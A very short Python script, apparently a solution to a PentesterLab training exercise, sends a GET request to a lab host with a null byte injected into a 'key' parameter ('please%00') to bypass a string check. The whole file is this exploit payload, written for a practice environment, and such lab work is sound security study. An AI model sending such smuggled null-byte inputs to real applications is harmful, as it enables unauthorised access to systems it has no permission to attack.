import requests

url = "http://ptl-43b1cb53-9c89845a.libcurl.so/"

response = requests.get(
    url=url + "pentesterlab?key=please%00"
)

print(response.text)